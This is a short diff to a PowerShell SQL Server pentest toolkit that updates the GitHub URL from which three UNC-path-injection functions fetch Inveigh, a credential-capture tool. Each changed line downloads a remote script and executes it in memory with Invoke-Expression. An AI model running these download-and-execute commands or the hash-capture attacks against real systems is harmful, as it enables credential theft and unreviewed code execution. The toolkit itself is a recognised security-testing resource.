@@ -1081,7 +1081,7 @@ Function Invoke-SQLUncPathInjection {
     {
         # Attempt to load Inveigh via reflection - naturally this bombs if there is no outbound internet. Exits if not loaded.
         try {
-            Invoke-Expression -Command (New-Object -TypeName system.net.webclient).downloadstring('https://raw.githubusercontent.com/Kevin-Robertson/Inveigh/master/Scripts/Inveigh.ps1') -ErrorAction Stop
+            Invoke-Expression -Command (New-Object -TypeName system.net.webclient).downloadstring('https://raw.githubusercontent.com/Kevin-Robertson/Inveigh/master/Inveigh.ps1') -ErrorAction Stop
             Write-Verbose "Inveigh loaded"
         } catch {
             $ErrorMessage = $_.Exception.Message
@@ -19902,7 +19902,7 @@ Function Invoke-SQLAuditPrivXpDirtree
                             }
 
                             # Attempt to load Inveigh via reflection
-                            Invoke-Expression -Command (New-Object -TypeName system.net.webclient).downloadstring('https://raw.githubusercontent.com/Kevin-Robertson/Inveigh/master/Scripts/Inveigh.ps1')
+                            Invoke-Expression -Command (New-Object -TypeName system.net.webclient).downloadstring('https://raw.githubusercontent.com/Kevin-Robertson/Inveigh/master/Inveigh.ps1')
 
                             $TestIt = Test-Path -Path Function:\Invoke-Inveigh
                             if($TestIt -eq 'True')
@@ -20243,7 +20243,7 @@ Function Invoke-SQLAuditPrivXpFileexist
                             #Invoke-Expression($InveighSrc)
 
                             # Attempt to load Inveigh via reflection
-                            Invoke-Expression -Command (New-Object -TypeName system.net.webclient).downloadstring('https://raw.githubusercontent.com/Kevin-Robertson/Inveigh/master/Scripts/Inveigh.ps1')
+                            Invoke-Expression -Command (New-Object -TypeName system.net.webclient).downloadstring('https://raw.githubusercontent.com/Kevin-Robertson/Inveigh/master/Inveigh.ps1')
 
                             $TestIt = Test-Path -Path Function:\Invoke-Inveigh
                             if($TestIt -eq 'True')
